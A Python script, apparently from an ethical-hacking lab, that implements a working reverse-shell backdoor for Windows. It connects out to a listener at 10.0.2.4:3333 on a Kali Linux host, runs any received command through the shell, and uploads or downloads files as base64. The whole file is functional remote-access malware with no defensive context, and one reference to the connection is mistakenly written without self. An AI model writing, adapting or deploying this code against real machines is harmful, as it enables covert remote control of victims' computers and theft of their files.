
import socket
import subprocess
# import json
import os
import base64
import simplejson

# python3 My-Socket-For-Windows.py
# this file will run on windows after My-Socket-Listener.py run on kali linux
# PORT_NUMBER is that we used 3333 for kali linux 

# socket.socket( {1} , {2} )
# 1. hangi ag ailesi ile calisilacak.
# 2. hangi yol ile veriler transfer edilecek.
class MySocket:
	def __init__(self, ip, port):
		self.my_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.my_connection.connect((ip, port))
		# my_connection.send("connected OK for windows\n")
	
	def command_execution(self, command) :
		# run command with shell
		return subprocess.check_output(command, shell=True)

	def json_send(self,data):
		json_data = simplejson.dumps(data)
		self.my_connection.send(json_data.encode("utf-8"))

	def json_receive(self):
		json_data = ""
		while True :
			try :
				json_data = json_data + self.my_connection.recv(1024).decode()
				return simplejson.loads(json_data)
			except ValueError :
				continue

	def execute_cd_comman(self,directory) :
		os.chdir(directory)
		return "Cd to " + directory

	def get_file_contents(self,path):
		with open(path,"rb") as my_file :
			return base64.b64encode(my_file.read())

	def save_file(self, path, content):
		with open(path, "wb") as my_file:
			my_file.write(base64.b64decode(content))
			return "Download OK"

	def start_socket(self):
		while True:
			# will be received '1024 byte' data 
			command = self.json_receive()
			try :
				if command[0] == "quit" :
					my_connection.close()
					exit()
				elif command[0] == "cd" and len(command) > 1 :
					command_output = self.execute_cd_comman(command[1])
				elif command[0] == "download" :
					command_output = self.get_file_contents(command[1])
				elif command[0] == "upload":
					#upload_data = command[1].split(" ")
					command_output = self.save_file(command[1], command[2])
				else :
					command_output = self.command_execution(command)
			except Exception:
				command_output = "Error!"
			self.json_send(command_output)

		self.my_connection.close()

my_socket_object = MySocket("10.0.2.4",3333)
my_socket_object.start_socket()